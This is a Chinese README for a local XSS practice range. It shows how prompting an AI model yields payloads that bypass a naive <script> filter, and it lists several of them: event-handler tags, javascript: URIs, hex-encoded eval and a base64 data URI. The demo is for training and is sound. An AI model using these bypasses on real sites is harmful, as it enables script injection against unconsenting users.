# DAST 演示靶场
本项目旨在演示利用 AI 大语言模型生成多样化、可绕过简单过滤的攻击载荷，以进行动态应用程序安全测试（DAST）。

## 目的
演示 AI 在 Web 渗透测试中，特别是 XSS (跨站脚本) 漏洞利用方面，生成高级、多样化攻击载荷的能力。

## 环境准备与运行步骤
1.  **安装依赖**
    确保您已安装 Python 3。然后通过 `pip` 安装项目所需的库：
    ```bash
    pip install -r requirements.txt
    ```

2.  **启动靶场**
    运行 Flask 应用来启动漏洞靶场：
    ```bash
    python app.py
    ```
    服务启动后，靶场将在以下地址运行：
    [http://127.0.0.1:5001](http://127.0.0.1:5001)
    

## 演示流程
1.  **访问靶场**
    在您的浏览器中打开 [http://127.0.0.1:5001](http://127.0.0.1:5001)。您会看到一个简单的输入框。
2.  **测试基础过滤器**
    *   在输入框中输入经典的 XSS 载荷：`<script>alert(1)</script>`。
    *   点击“提交”。
    *   **结果**：页面会显示 `[检测到并过滤了script标签]` 或类似提示，并且不会有弹窗出现。这证明了后端存在一个简单的、针对 `<script>` 标签的过滤器。
    
3.  **利用 AI 生成绕过载荷**
    *   打开一个 AI 大语言模型交互界面（例如 Copilot Chat、ChatGPT 等）。
    *   输入以下 Prompt:
        ```markdown
        你是一名Web渗透测试专家。我正在测试一个XSS漏洞，但目标对`<script>`标签进行了过滤。请生成5个可以绕过此过滤的XSS Payload，使用不同的编码和事件处理器。
        ```
    *   AI 模型会生成多个不依赖 `<script>` 标签的 XSS 载荷，例如：
        *   `<img src=x onerror=alert('XSS')>`
        *   `<svg onload=alert(1)>`
        *   `<body onload=alert('XSS')>`
        *   `<iframe src="javascript:alert('XSS');"></iframe>`
        *   `<a href="javascript:alert(1)">点击我</a>`
    *   当目标过滤了`<script>`标签时，我们可以使用多种替代技术来触发XSS漏洞。以下是5种不同的绕过方法，涵盖HTML事件处理器、伪协议、编码混淆等技术：
        *   **IMG标签+onerror事件（基础绕过）**
        ```html
        <img src=x onerror=alert(document.domain)>
        ```
        *   **SVG标签+onload事件（利用矢量图形）**
        ```html
        <svg onload=alert(1)>
        ```
        *    **JavaScript伪协议（href属性利用）**
        ```html
        <a href="javascript:alert('XSS')">Click me</a>
        ```
            或针对没有用户交互的情况：
        ```html
        <iframe src=javascript:alert`1`></iframe>
        ```
        *    **HTML实体编码+unicode混淆（高级编码绕过）**
        ```html
        <div onclick="alert('XSS')">Click this div</div>
        ```
            十六进制编码变体：
        ```html
        <div onclick="eval('\x61\x6c\x65\x72\x74\x28\x31\x29')">Hover me</div>
        ```
        *    **利用HTML5新标签/属性（data-*属性绕过）**
        ```html
        <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
        ```
            或使用details标签：
        ```html
        <details open ontoggle=alert(1)>
        ```
        *    **额外技巧**：
        - 如果空格被过滤，可以用`/`或换行符代替：
        ```html
        <img/src=x%0aonerror=alert(1)>
        ```
        - 使用反引号代替括号：
        ```html
        <svg onload=alert`1`>
        ```
        每种方法适用于不同的过滤场景，实际测试时需要根据目标的具体防御机制进行调整组合。建议先使用简单的payload测试基本过滤规则，再逐步尝试更复杂的绕过技术。
        
4.  **验证绕过**
    *   从 AI 生成的载荷中复制任意一个（例如 `<img src=x onerror=alert('XSS')>`）。
    *   将其粘贴到靶场的输入框中，然后点击“提交”。
    *   **结果**：浏览器成功弹出一个警告框。这证明了 AI 生成的载荷成功绕过了目标站点的防御机制。

## 讲解
“AI 不仅知道漏洞的存在，更知道如何创造性地绕过现有的防御措施。它不再仅仅是一个知识库，而是我们进行高级安全测试的‘智能武器库’。”
